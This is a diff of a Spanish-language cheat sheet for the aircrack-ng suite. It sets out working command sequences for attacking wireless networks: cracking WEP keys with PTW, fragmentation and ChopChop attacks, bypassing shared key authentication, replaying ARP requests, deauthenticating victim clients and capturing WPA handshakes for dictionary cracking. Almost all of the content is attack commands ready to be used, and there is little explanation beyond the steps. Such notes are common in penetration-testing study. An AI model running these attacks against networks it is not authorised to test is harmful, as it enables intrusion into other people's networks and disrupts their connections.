@@ -81,64 +81,67 @@ PTW Attack
 ------------
 airmon-ng start wlan0 [channel]
 airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
-Recomendable hacer un fake auth para tener la MAC asociada y que sea más fiable
-aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0
+(Recomendable hacer un fake auth para tener la MAC asociada y que sea más fiable) ->
+  aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0
 aireplay-ng -2 -b MAC-AP -d FF:FF:FF:FF:FF:FF -f 1 (filtrar que sean paquetes con FromDS) -m 68 -n 86 (min y max ARP packet size) mon0
-  Cuando encuentra un paquete y le damos a "y" para reenviar, los #Data deberían subir mucho. Si no suben, Ctrl+C y probar con otro. Se puede hacer 
+  Cuando encuentra un paquete y le damos a "y" para reenviar, los #Data deberían subir mucho. Si no suben, Ctrl+C y probar con otro. Se puede hacer ping desde otro cliente en la red para forzar un ARP
 aircrack-ng -0 -z (usa PTW Attack) -n 64 (num bits de WEP key) CAPTURE-FILENAME
 
 aireplay-ng -2 -r CAPTURA-CON-PAQUETE-VALIDO mon0
 
-######################
-
+#######################
 ATAQUE AP SIN CLIENTE
+#######################
 
 airmon-ng start wlan0 [channel]
 airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
-Primero hacer un fakeauth para mantener asociada nuestra MAC
-aireplay-ng -1 60 (para mantener el fakeauth cada 60 seg) -e ESSID-AP -a/-b MAC-AP -h NUESTRA-MAC mon0
+(Primero hacer un fakeauth para mantener asociada nuestra MAC)
+  aireplay-ng -1 60 (para mantener el fakeauth cada 60 seg) -e ESSID-AP -a/-b MAC-AP -h NUESTRA-MAC mon0
 
 Fragmentation Attack
-Espera un paquete, y cuando lo recibe comienza el ataque. Hace falta que la MAC usada esté asociada al AP. Hace falta estar razonablemente cerca del AP para que no falte ningún paquete
+----------------------
+(Espera un paquete, y cuando lo recibe comienza el ataque. Hace falta que la MAC usada esté asociada al AP. Hace falta estar razonablemente cerca del AP para que no falte ningún paquete)
 aireplay-ng -5 -b MAC-AP -h MAC-NUESTRA mon0
 packetforge-ng -0 (crear un ARP packet) -a MAP-AP -h NUESTRA-MAC -l SOURCE-IP -k BROADCAST-IP (o cualquier IP no asignada) -y .XOR-FILE -w DEST-FILENAME
 OPCIONAL tcpdump -n -vvv -e -s0 -r DEST-FILENAME-ANTERIOR
-aireplay-ng -2 -r DEST-FILENAME-ANTERIOR mon0
+aireplay-ng -2 (PTW Attack) -r DEST-FILENAME-ANTERIOR mon0
+
+aircrack-ng -0 CAPTURE-FILENAME
+
 
 ChopChop Attack
+-----------------
 aireplay-ng -4 -b MAC-AP -h NUESTRA-MAC mon0
-OPCIONAL tcpdump -s 0 -n -e -r ARCHIVO-OBTENIDO-.CAP
+  OPCIONAL tcpdump -s 0 -n -e -r ARCHIVO-OBTENIDO-.CAP
 packetforge-ng -0 -a MAC-AP -h NUESTRA-MAC -l SOURCE-IP (Obtenida con tcpdump en paso anterior) -k BROADCAST-IP -y .XOR-FILE -w DEST-FILENAME
 aireplay-ng -2 -r DEST-FILENAME-ANTERIOR mon0
 
 aircrack-ng -0 CAPTURE-FILENAME
 
 ###########################
-
-------------------------------
 SHARED KEY AUTHENTICATION
-------------------------------
+###########################
 
 airmon-ng start wlan0 [channel]
 airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
 
 Fake Authentication con SKA
+-----------------------------
 aireplay-ng -0 1 (deauth) -a MAC-AP -c MAC-VICTIM mon0 (Para que muestre si es SKA)
   Nos creará un .xor
 aireplay-ng -1 60 -e ESSID-AP -y .xor-FILE -a AP-MAC -h NUESTRA-MAC mon0
 
 ARP Request Replay Attack
+---------------------------
 aireplay-ng -3 -b MAC-AP -h NUESTRA-MAC mon0
-Hacemos un deauth para obtener un paquete ARP
+(Hacemos un deauth para obtener un paquete ARP)
 aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM mon0
 
 aircrack-ng -0 -z (usa PTW attack) -n 64 NOMBRE-CAPTURA
 
-##############################
-
-------------------------------
+####################
 WPA PRE SHARED KEY
-------------------------------
+####################
 
 airmon-ng start wlan0 [channel]
 airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
@@ -146,6 +149,10 @@ Capturamos el handshake =>
 aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM mon0
 (El paquete 1 y el 3 del 4way handshake tienen que tener el mismo nonce (mirar en wireshark))
 aircrack-ng -0 -w DICC[/pentest/passwords/john/password.lst] NOMBRE-CAPTURA
+
+#############
+####EXTRA####
+#############
 
 airolib-ng NOMBRE-DB-A-CREAR --import essid NOMBRE-ARCHIVO-CON-ESSID-TARGET
 airolib-ng NOMBRE-DB-ANTERIOR --stats
